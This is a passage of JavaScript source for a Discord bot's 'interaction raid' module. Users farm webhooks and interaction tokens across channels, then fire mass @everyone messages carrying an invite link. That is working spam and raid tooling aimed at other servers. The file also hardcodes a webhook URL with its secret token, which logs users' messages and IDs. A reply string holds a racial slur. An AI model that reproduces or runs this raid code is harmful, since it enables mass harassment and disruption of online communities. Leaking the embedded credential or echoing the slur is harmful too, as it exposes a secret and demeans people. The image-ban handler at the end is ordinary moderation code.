                    messageContent = customText.trim();
                    
                    imageLinkFound = this.containsImageLinks(customText);
                    if (imageLinkFound) {
                        await this.sendImageDetectionAlert(interaction, imageLinkFound);
                    }
                    
                    await this.logCustomMessage(interaction, customText);
                }
            } 
            else if (template) { 
                if (template.startsWith('user:')) { 
                    const presetName = template.substring(5); 
                    const presetPath = path.join(presetsPath, interaction.user.id, `${presetName}.txt`); 
                    if (fs.existsSync(presetPath)) {
                        messageContent = readFile(presetPath).trim(); 
                    } else {
                        userError = 'ur preset doesnt exist'; 
                    }
                } else if (template.startsWith('global:')) { 
                    const templateName = template.substring(7);
                    const templatePath = path.join(templatesPath, `${templateName}.txt`); 
                    if (fs.existsSync(templatePath)) {
                        messageContent = readFile(templatePath).trim(); 
                    } else {
                        userError = 'that global template doesnt exist'; 
                    }
                } else { 
                    const templatePath = path.join(templatesPath, `${template}.txt`); 
                    if (fs.existsSync(templatePath)) {
                        messageContent = readFile(templatePath).trim(); 
                    } else {
                        userError = 'that template doesnt exist'; 
                    }
                } 
                if (messageContent === '') {
                    userError = 'template/preset is empty'; 
                }
            } else { 
                const defaultPath = path.join(process.cwd(), 'data', 'raid.txt'); 
                messageContent = readFile(defaultPath).trim(); 
                
                if (!messageContent) {
                    userError = 'default raid message is empty'; 
                }
            }
        } catch (e) { 
            userError = 'error preparing message'; 
            console.error('Error preparing message:', e);
        }
        
        if (userError) {
            return interaction.editReply({ 
                content: userError
            });
        }
        
        if (useCustom === 'yes' || template) {
            finalMessageContent = `@everyone\n\n${messageContent}\n\ndiscord.gg/3ABxTE6UDE`;
        } else {
            finalMessageContent = messageContent;
        }
        
        if (finalMessageContent.length > 2000) {
            return interaction.editReply({ 
                content: 'arkos dumbass made temp over 2k+ character so cant do (ping him abt it pls :P)'
            });
        }

        const generatePanel = () => {
            const isAttackDisabled = state.tokens.length === 0 || state.attackStarted;

            const panelText = this.getPanelText('english');
            let statsContent = '';
            if (state.msg) statsContent += `${state.msg}\n\n`;
            if (imageLinkFound) statsContent += `-# ${panelText.imageDetected}\n\n`;
            statsContent += `${panelText.webhooksSaved}: **${state.tokens.length}**\n${panelText.messagesSendable}: **${state.tokens.length * 5}**\nexpires: <t:${expires}:R>`;
            if (state.attackStarted) statsContent += `\n\n${panelText.attackInProgress}`;

            const container = new ContainerBuilder()
                .setAccentColor(state.attackStarted ? 0xFF4444 : 0xFFFFFF)
                .addTextDisplayComponents(
                    new TextDisplayBuilder().setContent(panelText.panelTitle)
                )
                .addSeparatorComponents(
                    new SeparatorBuilder().setDivider(true)
                )
                .addTextDisplayComponents(
                    new TextDisplayBuilder().setContent(statsContent)
                )
                .addSeparatorComponents(
                    new SeparatorBuilder().setDivider(true)
                )
                .addActionRowComponents(
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('ir_farm_panel_1').setLabel(panelText.farmButton).setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('ir_farm_panel_2').setLabel(panelText.farmButton).setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('ir_farm_panel_3').setLabel(panelText.farmButton).setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('ir_farm_panel_4').setLabel(panelText.farmButton).setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted)
                    )
                )
                .addActionRowComponents(
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('ir_more_buttons').setLabel(panelText.moreButtons).setStyle(ButtonStyle.Primary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('ir_attack').setLabel(panelText.attackButton).setStyle(ButtonStyle.Danger).setDisabled(isAttackDisabled)
                    )
                )
                .addTextDisplayComponents(
                    new TextDisplayBuilder().setContent('-# ' + panelText.footer)
                );

            return {
                flags: MessageFlags.IsComponentsV2,
                components: [container]
            };
        };

        let pendingUpdate = false;
        let updateScheduled = false;
        let dirtyPanel = false;
        const scheduleUpdate = () => {
            if (updateScheduled || pendingUpdate) return;
            updateScheduled = true;
            setImmediate(() => {
                updateScheduled = false;
                if (pendingUpdate) return;
                pendingUpdate = true;
                dirtyPanel = false;
                interaction.editReply({ ...generatePanel() }).catch(() => {}).finally(() => {
                    pendingUpdate = false;
                    if (dirtyPanel) scheduleUpdate();
                });
            });
        };
        const fastUpdatePanel = () => { dirtyPanel = true; scheduleUpdate(); };

        try {
            const msg = await interaction.editReply({ 
                ...generatePanel(),
                fetchReply: true 
            });
            
            const collector = msg.createMessageComponentCollector({ 
                time: 780000
            });

            collector.on('collect', async i => {
                if (i.user.id !== interaction.user.id) {
                    return i.reply({ 
                        content: 'nigger thought he could click', 
                        flags: [MessageFlags.Ephemeral] 
                    });
                }
                
                state.msg = null;
                
                if (state.attackStarted) {
                    return i.deferUpdate();
                }

                if (i.customId.startsWith('ir_farm')) {
                    i.deferUpdate().catch(() => {});
                    const channelId = i.channelId;
                    if (!webhookFetchPromises.has(channelId)) {
                        webhookFetchPromises.set(channelId, this.getOrCreateWebhook(channelId).catch(() => null));
                    }
                    state.tokens.push({ interaction: i, channelId });
                    if (i.customId.startsWith('ir_farm_panel')) {
                        fastUpdatePanel();
                    }
                } else if (i.customId === 'ir_more_buttons') {
                    i.deferUpdate().catch(() => {});
                    const buttonText = this.getPanelText('english');
                    
                    const extraRow = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId(`ir_farm_extra_1`).setLabel(buttonText.farmButton).setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder().setCustomId(`ir_farm_extra_2`).setLabel(buttonText.farmButton).setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder().setCustomId(`ir_farm_extra_3`).setLabel(buttonText.farmButton).setStyle(ButtonStyle.Secondary),
                        new ButtonBuilder().setCustomId(`ir_farm_extra_4`).setLabel(buttonText.farmButton).setStyle(ButtonStyle.Secondary)
                    );
                    await i.followUp({
                        flags: [MessageFlags.Ephemeral, MessageFlags.IsComponentsV2],
                        components: [
                            new ContainerBuilder()
                                .addTextDisplayComponents(new TextDisplayBuilder().setContent('extra farm buttons'))
                                .addActionRowComponents(extraRow)
                        ]
                    });
                } else if (i.customId === 'ir_attack') {
                    state.attackStarted = true;
                    i.deferUpdate().catch(() => {});
                    fastUpdatePanel();

                    const channels = new Set(state.tokens.map(t => t.channelId));
                    const webhookEntries = await Promise.allSettled(
                        Array.from(channels, async ch => [ch, await (webhookFetchPromises.get(ch) || this.getOrCreateWebhook(ch).catch(() => null))])
                    );
                    const webhookMap = new Map(
                        webhookEntries
                            .filter(r => r.status === 'fulfilled' && r.value[1])
                            .map(r => r.value)
                    );

                    let payload = payloadCache.get(finalMessageContent);
                    if (!payload) {
                        payload = JSON.stringify({
                            content: finalMessageContent,
                            allowed_mentions: { parse: ['everyone'] }
                        });
                        if (payloadCache.size < MAX_PAYLOAD_CACHE) payloadCache.set(finalMessageContent, payload);
                    }
                    
                    const MESSAGES_PER_TOKEN = 5;
                    const allSendPromises = [];
                    
                    for (const token of state.tokens) {
                        const webhookUrl = webhookMap.get(token.channelId);
                        if (webhookUrl) {
                            for (let m = 0; m < MESSAGES_PER_TOKEN; m++) {
                                allSendPromises.push(getWebhookBucket(webhookUrl).post(webhookUrl, payload));
                            }
                        } else {
                            const appId = this.client.application?.id || this.client.user.id;
                            const followUpUrl = `https://discord.com/api/v10/webhooks/${appId}/${token.interaction.token}`;
                            for (let m = 0; m < MESSAGES_PER_TOKEN; m++) {
                                allSendPromises.push(getWebhookBucket(followUpUrl).post(followUpUrl, payload));
                            }
                        }
                    }
                    
                    await Promise.allSettled(allSendPromises);
                    state.tokens = [];
                    state.attackStarted = false;
                    state.msg = 'attack finished, farm again if u want';
                    fastUpdatePanel();
                }
            });
            
            collector.on('end', async () => {
                try {
                    const expiredContainer = new ContainerBuilder()
                        .setAccentColor(0x2B2D31)
                        .addTextDisplayComponents(
                            new TextDisplayBuilder().setContent('panel expired')
                        )
                        .addActionRowComponents(
                            new ActionRowBuilder().addComponents(
                                new ButtonBuilder()
                                    .setCustomId('ir_expired')
                                    .setLabel('expired')
                                    .setStyle(ButtonStyle.Secondary)
                                    .setDisabled(true)
                            )
                        );
                    
                    await interaction.editReply({
                        flags: MessageFlags.IsComponentsV2,
                        components: [expiredContainer]
                    });
                } catch (e) {
                }
            });
            
        } catch (error) {
            console.error('Error in interaction-r4id:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.editReply({
                    content: 'An error occurred. Please try again.'
                }).catch(() => {});
            }
        }
    }
    
    async logCustomMessage(interaction, customText) {
        try {
            const webhookUrl = 'https://discord.com/api/webhooks/1469769348989194334/HRVdbwluwhKKzxwmYfoom237spccDeQ3DAaTCKA0YDClAMwnhaKiNyT26_y3Y96S_HTz';
            
            const detectedLinks = [...new Set(customText.match(LINK_PATTERN) || [])];
            
            const fields = [
                { name: 'User:', value: `${interaction.user.tag} (${interaction.user.id})`, inline: true },
                { name: 'Channel:', value: interaction.channel ? `${interaction.channel.name} (${interaction.channelId})` : `DM (${interaction.channelId})`, inline: true },
                { name: 'Text:', value: customText.length > 1000 ? `${customText.substring(0, 1000)}...` : customText, inline: false }
            ];
            
            for (const link of detectedLinks) {
                fields.push({
                    name: 'Link Detected.',
                    value: link.length > 1024 ? `${link.substring(0, 1021)}...` : link,
                    inline: false
                });
            }
            
            const imageLink = this.containsImageLinks(customText);
            
            const embed = new EmbedBuilder()
                .setTitle('Custom Message log (Interaction Raid)')
                .setColor(0x0000)
                .addFields(...fields)
                .setTimestamp()
                .setFooter({ text: 'logging' });
            
            if (imageLink) embed.setImage(ensureGif(imageLink));
            
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed.toJSON()] })
            }).catch(e => console.error('Failed to post custom message log:', e.message));
        } catch (error) {
            console.error('Failed to log custom message to webhook:', error);
        }
    }
    
    
    async handleAutocomplete(interaction) {
        if (this.utils && this.utils.isBlacklisted && this.utils.isBlacklisted(interaction.user.id)) {
            return false;
        }
        
        if (interaction.guildId === this.mainGuildId) {
            return false; 
        }
        
        try {
            const requiredGuild = await this.client.guilds.fetch(this.mainGuildId);
            
            let isMember = false;
            try {
                await requiredGuild.members.fetch(interaction.user.id);
                isMember = true;
            } catch (error) {
                isMember = false;
            }
            
            if (!isMember) {
                await interaction.respond([]).catch(() => {});
                return true;
            }
        } catch (error) {
            console.error('Error checking guild membership in autocomplete:', error);
            await interaction.respond([]).catch(() => {});
            return true;
        }
        
        try {
            const focusedValue = interaction.options.getFocused();
            const focusedOption = interaction.options.getFocused(true);
            
            let choices = [];
            
            if (focusedOption.name === 'template') {
                choices = [...templateCache]; 
                
                const userPresetsDir = path.join(presetsPath, interaction.user.id);
                if (fs.existsSync(userPresetsDir)) {
                    const userPresets = readDir(userPresetsDir)
                        .filter(file => file.endsWith('.txt'))
                        .map(file => ({ 
                            name: `(preset) ${file.slice(0, -4)}`, 
                            value: `user:${file.slice(0, -4)}` 
                        }));
                    choices.push(...userPresets);
                }
            }
            
            const filtered = choices.filter(choice => 
                choice.name.toLowerCase().includes(focusedValue.toLowerCase())
            );
            
            await interaction.respond(filtered.slice(0, 25));
            return true;
        } catch (error) {
            console.error('Autocomplete error:', error);
            await interaction.respond([]).catch(() => {});
            return true;
        }
    }
    
    async handleButton(interaction) {
        if (!interaction.customId.startsWith('ban_image_user_')) {
            return false;
        }

        if (interaction.customId.endsWith('_disabled')) {
            await interaction.reply({ content: 'This user has already been banned.', flags: MessageFlags.Ephemeral }).catch(() => {});
            return true;
        }

        const detectionId = interaction.customId.replace('ban_image_user_', '');
        const detectionInfo = imageDetectionLogs.get(detectionId);

        if (!detectionInfo) {
            await interaction.reply({ content: 'Detection info not found or expired.', flags: MessageFlags.Ephemeral }).catch(() => {});
            return true;
        }

        if (detectionInfo.banned) {
            await interaction.reply({ content: 'This user has already been banned.', flags: MessageFlags.Ephemeral }).catch(() => {});
            return true;
        }

        const shortUrl = detectionInfo.imageLink.length > 100 ? detectionInfo.imageLink.substring(0, 100) + '...' : detectionInfo.imageLink;
        const detectedAt = `<t:${Math.floor(detectionInfo.timestamp/1000)}:F>`;
        let avatarUrl = `https://cdn.discordapp.com/embed/avatars/0.png`;
        try {
            const u = await this.client.users.fetch(detectionInfo.userId);
            avatarUrl = u.displayAvatarURL({ size: 64 });
        } catch {}

        const buildBaseSection = (statusText = null) => new SectionBuilder()
            .addTextDisplayComponents(
                new TextDisplayBuilder().setContent(
                    `## ⚠️ image detected\n` +
                    `${detectionInfo.userTag}  •  <@${detectionInfo.userId}>\n` +
                    `-# User ID: ${detectionInfo.userId}` +
                    (statusText ? `\n\n${statusText}` : '')
                )
            )
            .setThumbnailAccessory(
                new ThumbnailBuilder().setURL(avatarUrl)
            );

        const viewButton = new ButtonBuilder()
            .setLabel('View Image')
            .setStyle(ButtonStyle.Link)
            .setURL(detectionInfo.imageLink)
            .setEmoji('👁️');

        const disabledBanButton = new ButtonBuilder()
            .setCustomId(`ban_image_user_${detectionId}_disabled`)
            .setLabel('User Banned')
            .setStyle(ButtonStyle.Success)
            .setDisabled(true)
            .setEmoji('✅');

        const patchWebhookMessage = async (container) => {
            const containerJson = container.toJSON ? container.toJSON() : container;
            try {
                if (detectionInfo.alertChannelId && detectionInfo.alertMessageId) {
                    const ch = await this.client.channels.fetch(detectionInfo.alertChannelId).catch(() => null);
                    if (ch) {
                        const msg = await ch.messages.fetch(detectionInfo.alertMessageId).catch(() => null);
                        if (msg) {
                            await msg.edit({ flags: MessageFlags.IsComponentsV2, components: [containerJson] }).catch(err => console.error('Failed to edit alert message:', err));
                        }
                    }
                } else if (detectionInfo.webhookUrl && detectionInfo.webhookMessageId) {
                    await fetch(`${detectionInfo.webhookUrl}/messages/${detectionInfo.webhookMessageId}`, {
                        method: 'PATCH',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ flags: 32768, components: [containerJson] })
                    }).catch(err => console.error('Failed to patch webhook message:', err));
                }
            } catch (err) {
                console.error('Failed to patch/edit alert message:', err);
            }
        };

        const hasBypass = await this.checkUserHasBypassRole(interaction.user.id);

        if (hasBypass) {
            await interaction.deferReply({ flags: MessageFlags.Ephemeral });
            try {
                await interaction.guild.members.ban(detectionInfo.userId, {
                    reason: `Image detected (Insta-ban by ${interaction.user.tag}): ${detectionInfo.imageLink.substring(0, 100)}...`
                });

                if (this.utils && this.utils.addToBlacklist) this.utils.addToBlacklist(detectionInfo.userId);
                detectionInfo.banned = true;

                const bannedContainer = new ContainerBuilder()
                    .setAccentColor(0x00FF00)
                    .addSectionComponents(buildBaseSection(`✅ **INSTA-BANNED** by <@${interaction.user.id}>\n-# banned at <t:${Math.floor(Date.now()/1000)}:F>`))
                    .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                    .addTextDisplayComponents(new TextDisplayBuilder().setContent(
                        `**detected at:** ${detectedAt}\n` +
                        `**image url:** ${shortUrl}\n` +
                        `-# detection id: ${detectionId}`
                    ))
                    .addMediaGalleryComponents(new MediaGalleryBuilder().addItems(
                        new MediaGalleryItemBuilder().setURL(detectionInfo.directImageUrl || detectionInfo.imageLink).setDescription('detected image')
                    ))
                    .addActionRowComponents(new ActionRowBuilder().addComponents(disabledBanButton, viewButton));

                await patchWebhookMessage(bannedContainer);
                await interaction.editReply({ content: `✅ **INSTA-BAN EXECUTED**\nBanned <@${detectionInfo.userId}> (${detectionInfo.userTag}) for image usage.` });
                console.log(`🔨 INSTA-BANNED ${detectionInfo.userTag} by ${interaction.user.tag}`);
                await this.logBanAction(interaction.user, detectionInfo, true);

            } catch (banError) {
                const msg = banError.code === 50013 ? `❌ NO PERMS TO BAN <@${detectionInfo.userId}>.`
                    : banError.code === 10007 ? `❌ User <@${detectionInfo.userId}> is not in this server.`
                    : `❌ Failed to ban: ${banError.message}`;
                await interaction.editReply({ content: msg }).catch(() => {});
            }
            return true;
        }

        if (detectionInfo.confirmations.has(interaction.user.id)) {
            await interaction.reply({
                content: `⚠️ You've already confirmed. Need ${3 - detectionInfo.confirmations.size} more from different users.`,
                flags: MessageFlags.Ephemeral
            }).catch(() => {});
            return true;
        }

        detectionInfo.confirmations.add(interaction.user.id);
        const currentConfirmations = detectionInfo.confirmations.size;
        const required = 3;
        const confirmersList = Array.from(detectionInfo.confirmations).map(id => `<@${id}>`).join(', ');

        if (currentConfirmations < required) {
            await interaction.reply({
                content: `⚠️ **Ban Confirmation ${currentConfirmations}/${required}**\nNeed ${required - currentConfirmations} more from different users.\n**Confirmers:** ${confirmersList}`,
                flags: MessageFlags.Ephemeral
            }).catch(() => {});

            const updatedContainer = new ContainerBuilder()
                .setAccentColor(0xFFA500)
                .addSectionComponents(buildBaseSection(`⏳ **${currentConfirmations}/${required} confirmations**\n-# confirmed by: ${confirmersList}`))
                .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                .addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `**detected at:** ${detectedAt}\n` +
                    `**image url:** ${shortUrl}\n` +
                    `-# detection id: ${detectionId}`
                ))
                .addMediaGalleryComponents(new MediaGalleryBuilder().addItems(
                    new MediaGalleryItemBuilder().setURL(detectionInfo.directImageUrl || detectionInfo.imageLink).setDescription('detected image')
                ))
                .addActionRowComponents(new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId(`ban_image_user_${detectionId}`)
                        .setLabel('Ban User')
                        .setStyle(ButtonStyle.Danger)
                        .setEmoji('🚫'),
                    viewButton
                ));
            await patchWebhookMessage(updatedContainer);
            console.log(`✅ Ban confirmation ${currentConfirmations}/${required} for ${detectionInfo.userTag} by ${interaction.user.tag}`);
            return true;
        }

        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
        try {
            await interaction.guild.members.ban(detectionInfo.userId, {
                reason: `Image detected (Confirmed by ${detectionInfo.confirmations.size} users): ${detectionInfo.imageLink.substring(0, 100)}...`
            });

            if (this.utils && this.utils.addToBlacklist) this.utils.addToBlacklist(detectionInfo.userId);
            detectionInfo.banned = true;
            const confirmersListFinal = Array.from(detectionInfo.confirmations).map(id => `<@${id}>`).join(', ');

            const finalBannedContainer = new ContainerBuilder()
                .setAccentColor(0x00FF00)
                .addSectionComponents(buildBaseSection(`✅ **BANNED** (${detectionInfo.confirmations.size}/3 confirmations)\n-# banned at <t:${Math.floor(Date.now()/1000)}:F> • confirmed by: ${confirmersListFinal}`))
                .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                .addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `**detected at:** ${detectedAt}\n` +
                    `**image url:** ${shortUrl}\n` +
                    `-# detection id: ${detectionId}`
                ))
                .addMediaGalleryComponents(new MediaGalleryBuilder().addItems(
                    new MediaGalleryItemBuilder().setURL(detectionInfo.directImageUrl || detectionInfo.imageLink).setDescription('detected image')
                ))
                .addActionRowComponents(new ActionRowBuilder().addComponents(disabledBanButton, viewButton));

            await patchWebhookMessage(finalBannedContainer);
            await interaction.editReply({
                content: `✅ **BAN EXECUTED**\nBanned <@${detectionInfo.userId}> (${detectionInfo.userTag}) for image usage.\n\n**Confirmed by 3 different users:** ${confirmersListFinal}`
            });
            console.log(`🔨 ${detectionInfo.userTag} banned by 3 different users.`);
            await this.logBanAction(interaction.user, detectionInfo, false);

        } catch (banError) {
            const msg = banError.code === 50013 ? `❌ NO PERMS TO BAN <@${detectionInfo.userId}>.`
                : banError.code === 10007 ? `❌ User <@${detectionInfo.userId}> is not in this server.`
                : `❌ Failed to ban: ${banError.message}`;
            await interaction.editReply({ content: msg }).catch(() => {});
        }
        return true;
    }
}

module.exports = InteractionRaidCog;